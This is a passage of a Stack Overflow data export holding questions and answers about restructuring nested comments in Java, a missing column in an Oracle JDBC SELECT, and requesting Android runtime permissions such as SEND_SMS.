0).findFirst();\r\n\r\n        if (!discussionChild.isPresent()) {\r\n            discussionHierarchy.remove(discussionChild);\r\n\r\n            // These are level 1 comments\r\n            List&lt;DiscussionReplyRS&gt; discussionReplies = discussionHierarchy.stream()\r\n                    .filter(dr -&gt; Objects.equals(dr.getReplyToPostId(), discussionChild.get().getDiscussionReplyId()))\r\n                    .collect(Collectors.toList());\r\n\r\n            discussionHierarchy.remove(discussionReplies);\r\n\r\n            // This will be the list of comments for the rest of the levels\r\n            List&lt;DiscussionReplyRS&gt; discussionReplyChilds = new ArrayList&lt;&gt;(discussionHierarchy);\r\n\r\n            // The rest of the comments I leave as comments of 1st graders\r\n            //I don&#39;t know what to do next\r\n        }\r\n```\r\n","title":"How to combine comments from level 3 to level 2","body":"<p>Currently in my database there is data of posts and its comments. Each post will have many comments and comments can be level 2 3 4... Currently, I can query to get the comments level 1 of the article. And now I want my comment to have only 2 levels, level 1 and level 2 and its sub-levels</p>\n<pre><code>// Here is a list of comments including all levels\n        List&lt;DiscussionReplyRS&gt; discussionHierarchy = contentDAO.getListDiscussionReply(discussionId, spaceId).stream()\n                .filter(Objects::nonNull)\n                .map(DiscussionMapper::toDiscussionReplyRS)\n                .collect(Collectors.toList());\n\n        // Consider this the father of level 1 comments\n        Optional&lt;DiscussionReplyRS&gt; discussionChild = discussionHierarchy.stream()\n                .filter(dc -&gt; dc.getReplyToPostId() == 0).findFirst();\n\n        if (!discussionChild.isPresent()) {\n            discussionHierarchy.remove(discussionChild);\n\n            // These are level 1 comments\n            List&lt;DiscussionReplyRS&gt; discussionReplies = discussionHierarchy.stream()\n                    .filter(dr -&gt; Objects.equals(dr.getReplyToPostId(), discussionChild.get().getDiscussionReplyId()))\n                    .collect(Collectors.toList());\n\n            discussionHierarchy.remove(discussionReplies);\n\n            // This will be the list of comments for the rest of the levels\n            List&lt;DiscussionReplyRS&gt; discussionReplyChilds = new ArrayList&lt;&gt;(discussionHierarchy);\n\n            // The rest of the comments I leave as comments of 1st graders\n            //I don't know what to do next\n        }\n</code></pre>\n"},{"tags":["java","sql","oracle","jdbc"],"comments":[{"owner":{"account_id":1055494,"reputation":10205,"user_id":1058319,"accept_rate":98,"display_name":"Adel Boutros"},"score":0,"creation_date":1326034172,"post_id":8778422,"comment_id":10945430,"body_markdown":"When you do the **selectStat** query, what are the columns returned?","body":"When you do the <b>selectStat</b> query, what are the columns returned?"},{"owner":{"account_id":351616,"reputation":3033,"user_id":688206,"display_name":"Dan Hardiker"},"score":1,"creation_date":1326034282,"post_id":8778422,"comment_id":10945459,"body_markdown":"The problem will be in one of your SQL calls. I strongly recommend splitting your logic into discrete methods - each should only do one thing. Also output the stack trace, as it would tell you where in your program you&#39;re geting the problem, making errors quicker to diagnose.","body":"The problem will be in one of your SQL calls. I strongly recommend splitting your logic into discrete methods - each should only do one thing. Also output the stack trace, as it would tell you where in your program you&#39;re geting the problem, making errors quicker to diagnose."}],"answers":[{"tags":[],"owner":{"account_id":60456,"reputation":55961,"user_id":1054558,"accept_rate":100,"display_name":"Aaron"},"down_vote_count":0,"up_vote_count":10,"is_accepted":true,"score":10,"last_activity_date":1326034132,"creation_date":1326034132,"answer_id":8778456,"question_id":8778422,"body_markdown":"In your SELECT you are only getting &quot;pid&quot; and &quot;pname&quot;:\r\n\r\n    String selectProduct=&quot;SELECT pid, pname from product...\r\n\r\nBut then you&#39;re trying to use a field that isn&#39;t in your SELECT:\r\n\r\n    String productPrice = rows1.getString(&quot;price&quot;);\r\n\r\nTry putting &quot;price&quot; in your SELECT clause.","title":"Java Oracle JDBC SELECT statement","body":"<p>In your SELECT you are only getting \"pid\" and \"pname\":</p>\n\n<pre><code>String selectProduct=\"SELECT pid, pname from product...\n</code></pre>\n\n<p>But then you're trying to use a field that isn't in your SELECT:</p>\n\n<pre><code>String productPrice = rows1.getString(\"price\");\n</code></pre>\n\n<p>Try putting \"price\" in your SELECT clause.</p>\n"},{"tags":[],"owner":{"account_id":1156634,"reputation":576,"user_id":1137065,"accept_rate":58,"display_name":"uahakan"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1326034311,"creation_date":1326034203,"answer_id":8778464,"question_id":8778422,"body_markdown":"You have to replace \r\n\r\n    SELECT pid, pname from product where price&gt;20;\r\n\r\nwith \r\n\r\n    SELECT pid, pname, price from product where price&gt;20;\r\n\r\n","title":"Java Oracle JDBC SELECT statement","body":"<p>You have to replace </p>\n\n<pre><code>SELECT pid, pname from product where price&gt;20;\n</code></pre>\n\n<p>with </p>\n\n<pre><code>SELECT pid, pname, price from product where price&gt;20;\n</code></pre>\n"}],"owner":{"account_id":1106991,"reputation":568,"user_id":1098207,"accept_rate":73,"display_name":"mydreamadsl"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":38773,"favorite_count":0,"down_vote_count":1,"up_vote_count":7,"accepted_answer_id":8778456,"answer_count":2,"score":6,"last_activity_date":1683712754,"creation_date":1326033836,"question_id":8778422,"body_markdown":"I am practising Oracle JDBC using Java in Eclipse. I understood how to output `SELECT * from product` by iterating each line of the table using `.next()`. I am stuggling to output this statement:\r\n```sql\r\nSELECT pid, pname \r\nFROM product \r\nWHERE price&gt;20\r\n```\r\nHere is my code:\r\n\r\n    import java.sql.*;\r\n    \r\n    public class intro {\r\n    \r\n    \t/**\r\n    \t * @param args\r\n    \t */\r\n    \tpublic static void main(String[] args)\r\n    \t{\r\n    \t//\tthrows SQLException\r\n    \t\t\r\n    \t\t//initiazlie the connection\r\n    \t\t\r\n    \t\tConnection con=null;\r\n    \t\t\r\n    \t\ttry //try connection to database\r\n    \t\t{\r\n    \t\t\t//load driver\r\n    \t\t\tClass.forName(&quot;oracle.jdbc.OracleDriver&quot;);\r\n    \t\t\tSystem.out.println(&quot;Oracle JDBC driver loaded ok.&quot;);\r\n    \t\t\tcon=DriverManager.getConnection(&quot;jdbc:oracle:thin:test/123321@localhost:1521:orcl&quot;);\r\n    \t\t\tSystem.out.println(&quot;Connect with @oracle:1521:orcl&quot;);\r\n    \t\t\t\r\n    \t\t\t//declaring statement\r\n    \t\t\tStatement stmt = con.createStatement();\r\n    \t\t\t\r\n    \t\t\tString dropProductTable=&quot;drop table product cascade constraints&quot;;\r\n    \t\t\t\r\n    \t\t\t//create string\r\n    \t\t\tString createProductTable=&quot;CREATE TABLE product(&quot; +\r\n    \t\t\t &quot;pid number,&quot; +\r\n    \t\t\t &quot;pname CHAR(20),&quot; +\r\n    \t\t\t &quot;price number,&quot; +\r\n    \t\t\t &quot;PRIMARY KEY (pid)&quot; +\r\n    \t\t\t &quot;)&quot;; //do not add the semicolon(;) after closing the parenthesis.\r\n    \t\t\t\r\n    \t\t\t\r\n    \t\t\t/*drop table */\r\n    \t\t\tstmt.executeUpdate(dropProductTable);\r\n    \t\t\t\r\n    \t\t\t\r\n    \t\t\t//execute the create statement\r\n    \t\t\tstmt.executeUpdate(createProductTable);//execure the create statement\r\n    \t\t\t\r\n    \t\t\t//create string that holds the insert statement\r\n    \t\t\tString insertIntoProduct=&quot;INSERT INTO product VALUES (1,&#39;Pepsi&#39;,10)&quot;;\r\n    \t\t\tString insertIntoProduct1=&quot;INSERT INTO product VALUES (2,&#39;Fanta&#39;,20)&quot;;\r\n    \t\t\tString insertIntoProduct2=&quot;INSERT INTO product VALUES (3,&#39;Mirinda&#39;,30)&quot;;\r\n    \t\t\tString insertIntoProduct3=&quot;INSERT INTO product VALUES (4,&#39;Gum&#39;,5)&quot;;\r\n                String updatePrice=&quot;UPDATE product set price=55 where price=20&quot;;\r\n    \r\n    \r\n    \t\t\t\r\n    \t\t\t//stmt.executeUpdate(insertIntoProduct);\r\n    \t\t\tstmt.executeUpdate(insertIntoProduct);\r\n    \t\t\tstmt.executeUpdate(insertIntoProduct1);\r\n    \t\t\tstmt.executeUpdate(insertIntoProduct2);\r\n    \t\t\tstmt.executeUpdate(insertIntoProduct3);\r\n    \r\n               //update statement\r\n    \t\t\tstmt.executeUpdate(updatePrice);\r\n    \t\t\t\r\n    \r\n    \t\t\t\r\n    \t\t\t//save the select statement in a string\r\n    \t\t\tString selectStat=&quot;SELECT * FROM product&quot;;\r\n    \t\t\tString selectProduct=&quot;SELECT pid, pname from product where price&gt;20&quot;;\r\n    \t\t\t//stmt.executeUpdate(selectStat);\r\n    \t\t\t\r\n    \t\t\t//create a result set\r\n    \t\t\tResultSet rows = stmt.executeQuery(selectStat);\r\n    \t\t\tResultSet rows1= stmt.executeQuery(selectProduct);\r\n    \t\t\t\r\n    \t\t\t//stmt.executeQuery(selectStat);\r\n    \t\t\t\r\n    \t\t\t\r\n    \t\t\tint count=0;\r\n    \t\t\twhile (rows.next()) {\r\n    \t\t\t\tcount+=1;\r\n    \t\t\t\tString productNumber = rows.getString(&quot;pid&quot;);\r\n    \t\t\t\tString productName = rows.getString(&quot;pname&quot;);\r\n    \t\t\t\tString productPrice = rows.getString(&quot;price&quot;);\r\n    \t\t\t\tSystem.out.println(&quot;Row #:&quot;+count);\r\n    \t\t\t\tSystem.out.println(&quot;Product#: &quot;+productNumber);\r\n    \t\t\t\tSystem.out.println(&quot;Product Name: &quot;+productName);\r\n    \t\t\t\tSystem.out.println(&quot;Price: &quot;+productPrice);\r\n    \t\t\t\r\n    \t\t\t\t}\r\n    \t\t\t\r\n    \t\t\tint count1=0;\r\n    \t\t\twhile (rows1.next()) {\r\n    \t\t\t\tcount1+=1;\r\n    \t\t\t\tString productNumber = rows1.getString(&quot;pid&quot;);\r\n    \t\t\t\tString productName = rows1.getString(&quot;pname&quot;);\r\n    \t\t\t\tString productPrice = rows1.getString(&quot;price&quot;);\r\n    \t\t\t\tSystem.out.println(&quot;Row #:&quot;+count);\r\n    \t\t\t\tSystem.out.println(&quot;Product#: &quot;+productNumber);\r\n    \t\t\t\tSystem.out.println(&quot;Product Name: &quot;+productName);\r\n    \t\t\t\tSystem.out.println(&quot;Price: &quot;+productPrice);\r\n    \t\t\t\r\n    \t\t\t\t}\r\n    \t\t\t\r\n    \t\t\tcon.close();\r\n    \t\t\t\r\n    \t\t}\r\n    \t\t\t\tcatch (Exception e)\r\n    \t\t\t\t{\r\n    \t\t\t\t\tSystem.err.println(&quot;Exception:&quot;+e.getMessage());\r\n    \t\t\t\t}\r\n    \t\t\t\t\r\n    \t\t\r\n    \t\t}\r\n    \t\t\r\n    \t}\r\n\r\nWhen I am trying to ouput the `selectProduct` variable I get this error:\r\n&gt; Exception:Invalid column name\r\n\r\nHere is the output I am getting:\r\n&gt; ```lang-none\r\n&gt; Oracle JDBC driver loaded ok.\r\n&gt; Connect with @oracle:1521:orcl\r\n&gt; Row #:0\r\n&gt; Product#: 2\r\n&gt; Product Name: Fanta               \r\n&gt; Price: 55\r\n&gt; Row #:0\r\n&gt; Product#: 3\r\n&gt; Product Name: Mirinda             \r\n&gt; Price: 30\r\n&gt; ```","title":"Java Oracle JDBC SELECT statement","body":"<p>I am practising Oracle JDBC using Java in Eclipse. I understood how to output <code>SELECT * from product</code> by iterating each line of the table using <code>.next()</code>. I am stuggling to output this statement:</p>\n<pre class=\"lang-sql prettyprint-override\"><code>SELECT pid, pname \nFROM product \nWHERE price&gt;20\n</code></pre>\n<p>Here is my code:</p>\n<pre><code>import java.sql.*;\n\npublic class intro {\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args)\n    {\n    //  throws SQLException\n        \n        //initiazlie the connection\n        \n        Connection con=null;\n        \n        try //try connection to database\n        {\n            //load driver\n            Class.forName(&quot;oracle.jdbc.OracleDriver&quot;);\n            System.out.println(&quot;Oracle JDBC driver loaded ok.&quot;);\n            con=DriverManager.getConnection(&quot;jdbc:oracle:thin:test/123321@localhost:1521:orcl&quot;);\n            System.out.println(&quot;Connect with @oracle:1521:orcl&quot;);\n            \n            //declaring statement\n            Statement stmt = con.createStatement();\n            \n            String dropProductTable=&quot;drop table product cascade constraints&quot;;\n            \n            //create string\n            String createProductTable=&quot;CREATE TABLE product(&quot; +\n             &quot;pid number,&quot; +\n             &quot;pname CHAR(20),&quot; +\n             &quot;price number,&quot; +\n             &quot;PRIMARY KEY (pid)&quot; +\n             &quot;)&quot;; //do not add the semicolon(;) after closing the parenthesis.\n            \n            \n            /*drop table */\n            stmt.executeUpdate(dropProductTable);\n            \n            \n            //execute the create statement\n            stmt.executeUpdate(createProductTable);//execure the create statement\n            \n            //create string that holds the insert statement\n            String insertIntoProduct=&quot;INSERT INTO product VALUES (1,'Pepsi',10)&quot;;\n            String insertIntoProduct1=&quot;INSERT INTO product VALUES (2,'Fanta',20)&quot;;\n            String insertIntoProduct2=&quot;INSERT INTO product VALUES (3,'Mirinda',30)&quot;;\n            String insertIntoProduct3=&quot;INSERT INTO product VALUES (4,'Gum',5)&quot;;\n            String updatePrice=&quot;UPDATE product set price=55 where price=20&quot;;\n\n\n            \n            //stmt.executeUpdate(insertIntoProduct);\n            stmt.executeUpdate(insertIntoProduct);\n            stmt.executeUpdate(insertIntoProduct1);\n            stmt.executeUpdate(insertIntoProduct2);\n            stmt.executeUpdate(insertIntoProduct3);\n\n           //update statement\n            stmt.executeUpdate(updatePrice);\n            \n\n            \n            //save the select statement in a string\n            String selectStat=&quot;SELECT * FROM product&quot;;\n            String selectProduct=&quot;SELECT pid, pname from product where price&gt;20&quot;;\n            //stmt.executeUpdate(selectStat);\n            \n            //create a result set\n            ResultSet rows = stmt.executeQuery(selectStat);\n            ResultSet rows1= stmt.executeQuery(selectProduct);\n            \n            //stmt.executeQuery(selectStat);\n            \n            \n            int count=0;\n            while (rows.next()) {\n                count+=1;\n                String productNumber = rows.getString(&quot;pid&quot;);\n                String productName = rows.getString(&quot;pname&quot;);\n                String productPrice = rows.getString(&quot;price&quot;);\n                System.out.println(&quot;Row #:&quot;+count);\n                System.out.println(&quot;Product#: &quot;+productNumber);\n                System.out.println(&quot;Product Name: &quot;+productName);\n                System.out.println(&quot;Price: &quot;+productPrice);\n            \n                }\n            \n            int count1=0;\n            while (rows1.next()) {\n                count1+=1;\n                String productNumber = rows1.getString(&quot;pid&quot;);\n                String productName = rows1.getString(&quot;pname&quot;);\n                String productPrice = rows1.getString(&quot;price&quot;);\n                System.out.println(&quot;Row #:&quot;+count);\n                System.out.println(&quot;Product#: &quot;+productNumber);\n                System.out.println(&quot;Product Name: &quot;+productName);\n                System.out.println(&quot;Price: &quot;+productPrice);\n            \n                }\n            \n            con.close();\n            \n        }\n                catch (Exception e)\n                {\n                    System.err.println(&quot;Exception:&quot;+e.getMessage());\n                }\n                \n        \n        }\n        \n    }\n</code></pre>\n<p>When I am trying to ouput the <code>selectProduct</code> variable I get this error:</p>\n<blockquote>\n<p>Exception:Invalid column name</p>\n</blockquote>\n<p>Here is the output I am getting:</p>\n<blockquote>\n<pre class=\"lang-none prettyprint-override\"><code>Oracle JDBC driver loaded ok.\nConnect with @oracle:1521:orcl\nRow #:0\nProduct#: 2\nProduct Name: Fanta               \nPrice: 55\nRow #:0\nProduct#: 3\nProduct Name: Mirinda             \nPrice: 30\n</code></pre>\n</blockquote>\n"},{"tags":["java","android","android-permissions"],"comments":[{"owner":{"account_id":39846,"reputation":991133,"user_id":115145,"accept_rate":84,"display_name":"CommonsWare"},"score":0,"creation_date":1442508424,"post_id":32635704,"comment_id":53120071,"body_markdown":"What version of Android are you testing on?","body":"What version of Android are you testing on?"},{"owner":{"account_id":6970982,"reputation":2056,"user_id":5347360,"display_name":"Nathan Loudjani"},"score":0,"creation_date":1442509176,"post_id":32635704,"comment_id":53120522,"body_markdown":"I&#39;m testing on android 6.0","body":"I&#39;m testing on android 6.0"},{"owner":{"account_id":4069517,"reputation":2118,"user_id":3343174,"accept_rate":65,"display_name":"Fakher"},"score":1,"creation_date":1442509223,"post_id":32635704,"comment_id":53120546,"body_markdown":"surely it will work on a below version of android. There&#39;s a new philosophy of permissions in android 6.0","body":"surely it will work on a below version of android. There&#39;s a new philosophy of permissions in android 6.0"},{"owner":{"account_id":6970982,"reputation":2056,"user_id":5347360,"display_name":"Nathan Loudjani"},"score":0,"creation_date":1442509331,"post_id":32635704,"comment_id":53120621,"body_markdown":"Is there a special syntax for android 6 ? How can i be sure it works on below version ?","body":"Is there a special syntax for android 6 ? How can i be sure it works on below version ?"},{"owner":{"account_id":3422848,"reputation":5363,"user_id":2869767,"accept_rate":67,"display_name":"Sagar"},"score":0,"creation_date":1538054867,"post_id":32635704,"comment_id":92015644,"body_markdown":"my previous `targetsdkversion` was `23` updated to `27` after app update `READ_SMS` permission not working which is already enabled. please help","body":"my previous <code>targetsdkversion</code> was <code>23</code> updated to <code>27</code> after app update <code>READ_SMS</code> permission not working which is already enabled. please help"}],"answers":[{"tags":[],"owner":{"account_id":39846,"reputation":991133,"user_id":115145,"accept_rate":84,"display_name":"CommonsWare"},"down_vote_count":0,"up_vote_count":256,"is_accepted":true,"score":256,"last_activity_date":1603432410,"creation_date":1442509302,"answer_id":32636039,"question_id":32635704,"body_markdown":"&lt;sub&gt;(the following is extracted from [a blog post of mine about this][1])&lt;/sub&gt;\r\n\r\nThe big reason for not getting your permission nowadays is because\r\nyour project has a `targetSdkVersion` of 23 or higher, and the permission\r\nthat you are requesting is &quot;dangerous&quot;. In Android 6.0, this includes:\r\n\r\n- `ACCEPT_HANDOVER`\r\n- `ACCESS_BACKGROUND_LOCATION`\r\n- `ACCESS_MEDIA_LOCATION`\r\n- `ACTIVITY_RECOGNITION`\r\n- `ANSWER_PHONE_CALLS`\r\n- `ACCESS_COARSE_LOCATION`\r\n- `ACCESS_FINE_LOCATION`\r\n- `ADD_VOICEMAIL`\r\n- `BODY_SENSORS`\r\n- `CALL_PHONE`\r\n- `CAMERA`\r\n- `GET_ACCOUNTS`\r\n- `PROCESS_OUTGOING_CALLS`\r\n- `READ_CALENDAR`\r\n- `READ_CALL_LOG`\r\n- `READ_CELL_BROADCASTS`\r\n- `READ_CONTACTS`\r\n- `READ_EXTERNAL_STORAGE`\r\n- `READ_PHONE_STATE`\r\n- `READ_SMS`\r\n- `RECEIVE_MMS`\r\n- `RECEIVE_SMS`\r\n- `RECEIVE_WAP_PUSH`\r\n- `RECORD_AUDIO`\r\n- `SEND_SMS`\r\n- `USE_SIP`\r\n- `WRITE_CALENDAR`\r\n- `WRITE_CALL_LOG`\r\n- `WRITE_CONTACTS`\r\n- `WRITE_EXTERNAL_STORAGE`\r\n\r\nFor these permissions, not only does your `targetSdkVersion` 23+ app\r\nneed to have the `&lt;uses-permission&gt;` element(s), but you also have\r\nto ask for those permissions at runtime from the user on Android 6.0+\r\ndevices, using methods like `checkSelfPermission()` and\r\n`requestPermissions()`.\r\n\r\nAs a temporary workaround, drop your `targetSdkVersion` below 23.\r\n\r\nHowever, eventually, you will have some reason to want your\r\n`targetSdkVersion` to be 23 or higher. At that time, you will need\r\nto adjust your app to use the new runtime permission system.\r\nThe Android documentation has\r\n[a page dedicated to this topic](http://developer.android.com/training/permissions/requesting.html).\r\n\r\n\r\n  [1]: https://commonsware.com/blog/2015/08/31/hey-where-did-my-permission-go.html","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p><sub>(the following is extracted from <a href=\"https://commonsware.com/blog/2015/08/31/hey-where-did-my-permission-go.html\" rel=\"noreferrer\">a blog post of mine about this</a>)</sub></p>\n<p>The big reason for not getting your permission nowadays is because\nyour project has a <code>targetSdkVersion</code> of 23 or higher, and the permission\nthat you are requesting is &quot;dangerous&quot;. In Android 6.0, this includes:</p>\n<ul>\n<li><code>ACCEPT_HANDOVER</code></li>\n<li><code>ACCESS_BACKGROUND_LOCATION</code></li>\n<li><code>ACCESS_MEDIA_LOCATION</code></li>\n<li><code>ACTIVITY_RECOGNITION</code></li>\n<li><code>ANSWER_PHONE_CALLS</code></li>\n<li><code>ACCESS_COARSE_LOCATION</code></li>\n<li><code>ACCESS_FINE_LOCATION</code></li>\n<li><code>ADD_VOICEMAIL</code></li>\n<li><code>BODY_SENSORS</code></li>\n<li><code>CALL_PHONE</code></li>\n<li><code>CAMERA</code></li>\n<li><code>GET_ACCOUNTS</code></li>\n<li><code>PROCESS_OUTGOING_CALLS</code></li>\n<li><code>READ_CALENDAR</code></li>\n<li><code>READ_CALL_LOG</code></li>\n<li><code>READ_CELL_BROADCASTS</code></li>\n<li><code>READ_CONTACTS</code></li>\n<li><code>READ_EXTERNAL_STORAGE</code></li>\n<li><code>READ_PHONE_STATE</code></li>\n<li><code>READ_SMS</code></li>\n<li><code>RECEIVE_MMS</code></li>\n<li><code>RECEIVE_SMS</code></li>\n<li><code>RECEIVE_WAP_PUSH</code></li>\n<li><code>RECORD_AUDIO</code></li>\n<li><code>SEND_SMS</code></li>\n<li><code>USE_SIP</code></li>\n<li><code>WRITE_CALENDAR</code></li>\n<li><code>WRITE_CALL_LOG</code></li>\n<li><code>WRITE_CONTACTS</code></li>\n<li><code>WRITE_EXTERNAL_STORAGE</code></li>\n</ul>\n<p>For these permissions, not only does your <code>targetSdkVersion</code> 23+ app\nneed to have the <code>&lt;uses-permission&gt;</code> element(s), but you also have\nto ask for those permissions at runtime from the user on Android 6.0+\ndevices, using methods like <code>checkSelfPermission()</code> and\n<code>requestPermissions()</code>.</p>\n<p>As a temporary workaround, drop your <code>targetSdkVersion</code> below 23.</p>\n<p>However, eventually, you will have some reason to want your\n<code>targetSdkVersion</code> to be 23 or higher. At that time, you will need\nto adjust your app to use the new runtime permission system.\nThe Android documentation has\n<a href=\"http://developer.android.com/training/permissions/requesting.html\" rel=\"noreferrer\">a page dedicated to this topic</a>.</p>\n"},{"tags":[],"owner":{"account_id":5049203,"reputation":527,"user_id":4054285,"display_name":"Dharmendra Pratap"},"down_vote_count":1,"up_vote_count":8,"is_accepted":false,"score":7,"last_activity_date":1463837576,"creation_date":1463837576,"answer_id":37363632,"question_id":32635704,"body_markdown":"If you are using sdk 23 or higher then you must check run time permissions.","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>If you are using sdk 23 or higher then you must check run time permissions.</p>\n"},{"tags":[],"owner":{"account_id":2138701,"reputation":1077,"user_id":1897885,"display_name":"Dumi Jay"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1465885423,"creation_date":1465885423,"answer_id":37804383,"question_id":32635704,"body_markdown":"Along with CommonsWare&#39;s answer,\r\n\r\nThere is a Security Setting (I checked on CM13) to set SMS Message Limit. If you set this to &quot;None&quot;, OS will popup a Dialog for every SMS, even after obtaining SMS_SEND permission in the runtime. Best thing is to set this to maximum.\r\n\r\nIf the maximum is not enough, there are ways to increases the maximum rate on a rooted device.","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>Along with CommonsWare's answer,</p>\n\n<p>There is a Security Setting (I checked on CM13) to set SMS Message Limit. If you set this to \"None\", OS will popup a Dialog for every SMS, even after obtaining SMS_SEND permission in the runtime. Best thing is to set this to maximum.</p>\n\n<p>If the maximum is not enough, there are ways to increases the maximum rate on a rooted device.</p>\n"},{"tags":[],"owner":{"account_id":8456658,"reputation":20415,"user_id":6343685,"accept_rate":60,"display_name":"Harshad Pansuriya"},"down_vote_count":0,"up_vote_count":6,"is_accepted":false,"score":6,"last_activity_date":1467371703,"creation_date":1467371703,"answer_id":38144014,"question_id":32635704,"body_markdown":" when you declare `permisson` in `Manifest` and it&#39;s not work means you are performing Task in `MarshMallow` and for `MarshMallow` you have set Permisson at `RunTime`.\r\n\r\nlike this way\r\n\r\n    ActivityCompat.requestPermissions();","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>when you declare <code>permisson</code> in <code>Manifest</code> and it's not work means you are performing Task in <code>MarshMallow</code> and for <code>MarshMallow</code> you have set Permisson at <code>RunTime</code>.</p>\n\n<p>like this way</p>\n\n<pre><code>ActivityCompat.requestPermissions();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9648890,"reputation":564,"user_id":7160632,"accept_rate":45,"display_name":"Masquitos"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1479225847,"creation_date":1479225847,"answer_id":40614426,"question_id":32635704,"body_markdown":"I added this to my MainActivity, that resolve my problem \r\n \r\n\r\n           int MY_PERMISSIONS_REQUEST_READ_CONTACTS=0;\r\n    // Here, thisActivity is the current activity\r\n            if (ContextCompat.checkSelfPermission(this,\r\n                    Manifest.permission.WRITE_EXTERNAL_STORAGE)\r\n                    != PackageManager.PERMISSION_GRANTED) {\r\n    \r\n                // Should we show an explanation?\r\n                if (ActivityCompat.shouldShowRequestPermissionRationale(this,\r\n                        Manifest.permission.WRITE_EXTERNAL_STORAGE)) {\r\n    \r\n                    // Show an expanation to the user *asynchronously* -- don&#39;t block\r\n                    // this thread waiting for the user&#39;s response! After the user\r\n                    // sees the explanation, try again to request the permission.\r\n    \r\n                } else {\r\n    \r\n                    // No explanation needed, we can request the permission.\r\n    \r\n                    ActivityCompat.requestPermissions(this,\r\n                            new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},\r\n                            MY_PERMISSIONS_REQUEST_READ_CONTACTS);\r\n    \r\n                    // MY_PERMISSIONS_REQUEST_READ_CONTACTS is an\r\n                    // app-defined int constant. The callback method gets the\r\n                    // result of the request.\r\n                }\r\n            }","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>I added this to my MainActivity, that resolve my problem </p>\n\n<pre><code>       int MY_PERMISSIONS_REQUEST_READ_CONTACTS=0;\n// Here, thisActivity is the current activity\n        if (ContextCompat.checkSelfPermission(this,\n                Manifest.permission.WRITE_EXTERNAL_STORAGE)\n                != PackageManager.PERMISSION_GRANTED) {\n\n            // Should we show an explanation?\n            if (ActivityCompat.shouldShowRequestPermissionRationale(this,\n                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) {\n\n                // Show an expanation to the user *asynchronously* -- don't block\n                // this thread waiting for the user's response! After the user\n                // sees the explanation, try again to request the permission.\n\n            } else {\n\n                // No explanation needed, we can request the permission.\n\n                ActivityCompat.requestPermissions(this,\n                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},\n                        MY_PERMISSIONS_REQUEST_READ_CONTACTS);\n\n                // MY_PERMISSIONS_REQUEST_READ_CONTACTS is an\n                // app-defined int constant. The callback method gets the\n                // result of the request.\n            }\n        }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9671909,"reputation":1521,"user_id":7176550,"display_name":"user7176550"},"down_vote_count":0,"up_vote_count":33,"is_accepted":false,"score":33,"last_activity_date":1551013471,"creation_date":1485865211,"answer_id":41957460,"question_id":32635704,"body_markdown":"Above API level 23 you will be given programmatically pragmatically like:\r\n     \r\n        private static final int PERMISSION_REQUEST_CODE = 1;\r\n\r\n        if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.M) {\r\n\r\n            if (checkSelfPermission(Manifest.permission.SEND_SMS)\r\n                    == PackageManager.PERMISSION_DENIED) {\r\n\r\n                Log.d(&quot;permission&quot;, &quot;permission denied to SEND_SMS - requesting it&quot;);\r\n                String[] permissions = {Manifest.permission.SEND_SMS};\r\n\r\n                requestPermissions(permissions, PERMISSION_REQUEST_CODE);\r\n\r\n            }\r\n        }","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>Above API level 23 you will be given programmatically pragmatically like:</p>\n\n<pre><code>    private static final int PERMISSION_REQUEST_CODE = 1;\n\n    if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.M) {\n\n        if (checkSelfPermission(Manifest.permission.SEND_SMS)\n                == PackageManager.PERMISSION_DENIED) {\n\n            Log.d(\"permission\", \"permission denied to SEND_SMS - requesting it\");\n            String[] permissions = {Manifest.permission.SEND_SMS};\n\n            requestPermissions(permissions, PERMISSION_REQUEST_CODE);\n\n        }\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8248844,"reputation":9692,"user_id":6204133,"display_name":"Dan Alboteanu"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1538549574,"creation_date":1493995949,"answer_id":43808024,"question_id":32635704,"body_markdown":"request permission pragmatically (after API 23)\r\n\r\n    if (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.SEND_SMS)\r\n        != PackageManager.PERMISSION_GRANTED) {\r\n        // Permission is not granted \r\n        // Ask for permision\r\n        ActivityCompat.requestPermissions(this,new String[] { Manifest.permission.SEND_SMS}, 1); \r\n    } \r\n    else {\r\n    // Permission has already been granted\r\n    }\r\n\r\n&quot;If the app has the permission, the method checkSelfPermission() returns PERMISSION_GRANTED, and the app can proceed with the operation. \r\n\r\nIf the app does not have the permission, the method returns PERMISSION_DENIED, and the app has to explicitly ask the user for permission. You need to prompt the user for that permission, as shown in the above code. Calling requestPermissions() brings up a standard Android dialog, which you cannot customize.&quot;\r\n\r\n \r\n\r\n\r\n\r\n  \r\n","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>request permission pragmatically (after API 23)</p>\n\n<pre><code>if (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.SEND_SMS)\n    != PackageManager.PERMISSION_GRANTED) {\n    // Permission is not granted \n    // Ask for permision\n    ActivityCompat.requestPermissions(this,new String[] { Manifest.permission.SEND_SMS}, 1); \n} \nelse {\n// Permission has already been granted\n}\n</code></pre>\n\n<p>\"If the app has the permission, the method checkSelfPermission() returns PERMISSION_GRANTED, and the app can proceed with the operation. </p>\n\n<p>If the app does not have the permission, the method returns PERMISSION_DENIED, and the app has to explicitly ask the user for permission. You need to prompt the user for that permission, as shown in the above code. Calling requestPermissions() brings up a standard Android dialog, which you cannot customize.\"</p>\n"},{"tags":[],"owner":{"account_id":5154882,"reputation":984,"user_id":4128371,"display_name":"Zohaib 